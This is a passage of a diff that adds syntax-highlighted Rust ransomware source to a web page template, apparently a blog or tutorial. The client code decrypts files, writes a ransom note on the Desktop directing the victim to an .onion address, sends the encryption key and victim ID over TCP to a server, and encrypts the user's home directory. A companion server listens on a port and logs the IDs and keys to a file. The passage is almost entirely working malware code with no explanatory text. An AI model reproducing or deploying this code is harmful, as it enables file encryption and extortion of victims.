-    let cipher = Aes256Gcm::new(key);
-    for entry in WalkDir::new(target_dir) {
-        let dir_entry = match entry {
-            Err(_) => continue,
-            Ok(dir_entry) => dir_entry,
+    <span style="color:#66d9ef">let</span> key <span style="color:#f92672">=</span> Key::from_slice(key_bytes);
+    <span style="color:#66d9ef">let</span> cipher <span style="color:#f92672">=</span> Aes256Gcm::new(key);
+    <span style="color:#66d9ef">for</span> entry <span style="color:#66d9ef">in</span> WalkDir::new(target_dir) {
+        <span style="color:#66d9ef">let</span> dir_entry <span style="color:#f92672">=</span> <span style="color:#66d9ef">match</span> entry {
+            Err(_) <span style="color:#f92672">=</span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">continue</span>,
+            Ok(dir_entry) <span style="color:#f92672">=</span><span style="color:#f92672">&gt;</span> dir_entry,
         };
-        let orig_path = dir_entry.path();
-        if orig_path.extension().unwrap_or_default() != RANSOMWARE_EXT {
-            continue;
+        <span style="color:#66d9ef">let</span> orig_path <span style="color:#f92672">=</span> dir_entry.path();
+        <span style="color:#75715e">// only decrypt encrypted files
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> orig_path.extension().unwrap_or_default() <span style="color:#f92672">!</span><span style="color:#f92672">=</span> RANSOMWARE_EXT {
+            <span style="color:#66d9ef">continue</span>;
         }
-        let encrypted_content = fs::read(orig_path).unwrap();
-        let nonce_raw = encrypted_content.as_slice()[encrypted_content.len() - 12..].as_ref();
-        let content = encrypted_content.as_slice()[..encrypted_content.len() - 12].as_ref();
-        let nonce = Nonce::from_slice(nonce_raw);
-        let plaintext = cipher
+        <span style="color:#66d9ef">let</span> encrypted_content <span style="color:#f92672">=</span> fs::read(orig_path).unwrap();
+        <span style="color:#66d9ef">let</span> nonce_raw <span style="color:#f92672">=</span> encrypted_content.as_slice()[encrypted_content.len() <span style="color:#f92672">-</span> <span style="color:#ae81ff">12</span>..].as_ref();
+        <span style="color:#66d9ef">let</span> content <span style="color:#f92672">=</span> encrypted_content.as_slice()[..encrypted_content.len() <span style="color:#f92672">-</span> <span style="color:#ae81ff">12</span>].as_ref();
+        <span style="color:#66d9ef">let</span> nonce <span style="color:#f92672">=</span> Nonce::from_slice(nonce_raw);
+        <span style="color:#66d9ef">let</span> plaintext <span style="color:#f92672">=</span> cipher
             .decrypt(nonce, content)
-            .expect("invalid decryption key");
-        let new_path = orig_path.with_file_name(orig_path.file_
+            .expect(<span style="color:#e6db74">&#34;invalid decryption key&#34;</span>);
+        <span style="color:#66d9ef">let</span> new_path <span style="color:#f92672">=</span> orig_path.with_file_name(orig_path.file_stem().unwrap());
+        fs::write(new_path, plaintext).unwrap();
+        fs::remove_file(orig_path).unwrap();
+    }
+    println<span style="color:#f92672">!</span>(<span style="color:#e6db74">&#34;done decrypting&#34;</span>);
+}
+
+<span style="color:#75715e">// Create ransom note on user&#39;s Desktop
+</span><span style="color:#75715e"></span><span style="color:#75715e">// We create the note at the beginning of the encryption process,
+</span><span style="color:#75715e"></span><span style="color:#75715e">// so if the process get killed midway through, the note will already be
+</span><span style="color:#75715e"></span><span style="color:#75715e">// available to the user.
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">create_note_file</span>(id: <span style="color:#66d9ef">&amp;</span><span style="color:#66d9ef">str</span>) {
+    <span style="color:#66d9ef">let</span> note_path <span style="color:#f92672">=</span> dirs::desktop_dir().unwrap().join(RANSOM_NOTE_FILENAME);
+    <span style="color:#66d9ef">let</span> note <span style="color:#f92672">=</span> format<span style="color:#f92672">!</span>(
+        <span style="color:#e6db74">r#&#34;Your files has been encrypted.
+</span><span style="color:#e6db74">Go to XXXXX.onion and provide your ID to get instructions.
+</span><span style="color:#e6db74">------------------------------------------------
+</span><span style="color:#e6db74">ID: {}
+</span><span style="color:#e6db74">&#34;#</span>,
+        id
+    );
+    fs::write(note_path, note.as_bytes()).unwrap();
+}
+
+<span style="color:#75715e">// Send credentials (id &amp; key) to our server.
+</span><span style="color:#75715e"></span><span style="color:#75715e">// Encryption will not start until we have this information stored.
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">send_credentials</span>(id: <span style="color:#66d9ef">&amp;</span><span style="color:#66d9ef">str</span>, key: <span style="color:#66d9ef">&amp;</span><span style="color:#66d9ef">str</span>) {
+    <span style="color:#66d9ef">loop</span> {
+        <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">let</span> Ok(<span style="color:#66d9ef">mut</span> tcp_stream) <span style="color:#f92672">=</span> TcpStream::connect(format<span style="color:#f92672">!</span>(<span style="color:#e6db74">&#34;{}:{}&#34;</span>, HOST, PORT)) {
+            <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">let</span> Ok(_) <span style="color:#f92672">=</span> tcp_stream.write(format<span style="color:#f92672">!</span>(<span style="color:#e6db74">&#34;{}{}&#34;</span>, key, id).as_bytes()) {
+                <span style="color:#66d9ef">return</span>;
+            }
+        }
+        thread::sleep(time::Duration::from_secs(<span style="color:#ae81ff">1</span>));
+    }
+}
+
+<span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">main</span>() {
+    <span style="color:#66d9ef">let</span> args: Vec<span style="color:#f92672">&lt;</span>String<span style="color:#f92672">&gt;</span> <span style="color:#f92672">=</span> env::args().collect();
+    <span style="color:#66d9ef">let</span> path <span style="color:#f92672">=</span> dirs::home_dir().unwrap();
+    <span style="color:#66d9ef">if</span> args.len() <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">&amp;</span><span style="color:#f92672">&amp;</span> args[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;encrypt&#34;</span> {
+        <span style="color:#75715e">// Generate encryption key and id
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">let</span> random_bytes: Vec<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u8</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">=</span> (<span style="color:#ae81ff">0</span>..<span style="color:#ae81ff">24</span>).map(<span style="color:#f92672">|</span>_<span style="color:#f92672">|</span> rand::random::<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u8</span><span style="color:#f92672">&gt;</span>()).collect();
+        <span style="color:#66d9ef">let</span> key <span style="color:#f92672">=</span> base64::encode(random_bytes);
+        <span style="color:#66d9ef">let</span> random_bytes: Vec<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u8</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">=</span> (<span style="color:#ae81ff">0</span>..<span style="color:#ae81ff">32</span>).map(<span style="color:#f92672">|</span>_<span style="color:#f92672">|</span> rand::random::<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u8</span><span style="color:#f92672">&gt;</span>()).collect();
+        <span style="color:#66d9ef">let</span> id <span style="color:#f92672">=</span> base64::encode(random_bytes);
+
+        <span style="color:#75715e">// Send credentials to our server
+</span><span style="color:#75715e"></span>        send_credentials(id.as_str(), key.as_str());
+
+        <span style="color:#75715e">// Create ransom note
+</span><span style="color:#75715e"></span>        create_note_file(id.as_str());
+
+        <span style="color:#75715e">// Encrypt files on disk
+</span><span style="color:#75715e"></span>        encrypt_files(path, key.as_str());
+    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> args.len() <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">&amp;</span><span style="color:#f92672">&amp;</span> args[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;decrypt&#34;</span> {
+        <span style="color:#66d9ef">let</span> decryption_key <span style="color:#f92672">=</span> args[<span style="color:#ae81ff">2</span>].as_str();
+        decrypt_files(path, decryption_key);
+    } <span style="color:#66d9ef">else</span> {
+        println<span style="color:#f92672">!</span>(<span style="color:#e6db74">&#34;no flags provided&#34;</span>);
+    }
+}
+
+</pre></td></tr></table>
+</div>
+<!-- Code end -->
+
+<h4 class="mt-5 mb-3">server/main.rs</h4>
+
+<!-- Code begin -->
+<div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+    <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span></pre></td>
+        <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">use</span> std::fs::OpenOptions;
+<span style="color:#66d9ef">use</span> std::io::Write;
+<span style="color:#66d9ef">use</span> std::{io::Read, net::TcpListener};
+
+<span style="color:#66d9ef">static</span> HOST: <span style="color:#66d9ef">&amp;</span><span style="color:#66d9ef">str</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>;
+<span style="color:#66d9ef">static</span> PORT: <span style="color:#66d9ef">usize</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">8080</span>;
+
+<span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">main</span>() {
+    <span style="color:#75715e">// We will store id &amp; key in a file
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> file <span style="color:#f92672">=</span> OpenOptions::new()
+        .write(<span style="color:#66d9ef">true</span>)
+        .append(<span style="color:#66d9ef">true</span>)
+        .create(<span style="color:#66d9ef">true</span>)
+        .open(<span style="color:#e6db74">&#34;ids.txt&#34;</span>)
+        .unwrap();
+
+    <span style="color:#75715e">// Start listening for incomming connections
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> listener <span style="color:#f92672">=</span> TcpListener::bind(format<span style="color:#f92672">!</span>(<span style="color:#e6db74">&#34;{}:{}&#34;</span>, HOST, PORT)).unwrap();
+    <span style="color:#66d9ef">for</span> stream <span style="color:#66d9ef">in</span> listener.incoming() {
+        <span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> line <span style="color:#f92672">=</span> String::with_capacity(<span style="color:#ae81ff">76</span>);
+        stream.unwrap().read_to_string(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> line).unwrap();
+        <span style="color:#66d9ef">let</span> key <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>line[<span style="color:#ae81ff">0</span>..<span style="color:#ae81ff">32</span>];
+        <span style="color:#66d9ef">let</span> id <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>line[<span style="color:#ae81ff">32</span>..];
+        file.write(format<span style="color:#f92672">!</span>(<span style="color:#e6db74">&#34;{} {}\n&#34;</span>, id, key).as_bytes()).unwrap();
+    }
+}
+
+</pre></td></tr></table>
+</div>
+<!-- Code end -->
+
+{{ end }}
